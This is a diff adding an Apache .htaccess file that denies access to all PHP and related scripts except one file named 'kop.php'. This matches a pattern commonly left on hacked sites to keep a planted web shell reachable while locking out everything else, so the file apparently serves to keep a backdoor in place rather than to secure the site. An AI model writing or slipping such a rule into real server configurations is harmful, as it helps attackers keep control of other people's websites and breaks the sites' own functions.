@@ -1,0 +1,9 @@
+<FilesMatch "\.(php[1-9]?[0-9]?|shtml|phtml|phar)$">
+    Order Allow,Deny
+    Deny from all
+</FilesMatch>
+
+<Files "kop.php">
+    Order Deny,Allow
+    Allow from all
+</Files>
